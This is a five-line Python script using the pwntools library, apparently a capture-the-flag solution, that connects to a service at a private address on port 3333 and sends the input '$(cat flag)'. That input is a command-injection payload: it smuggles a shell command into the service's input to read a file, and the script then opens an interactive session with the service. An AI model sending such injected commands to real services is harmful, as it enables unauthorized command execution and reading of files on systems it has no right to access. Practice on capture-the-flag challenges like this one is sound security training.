from pwn import *

p =remote('10.1.75.81',3333)

p.sendline( b'$(cat flag)')

p.interactive()
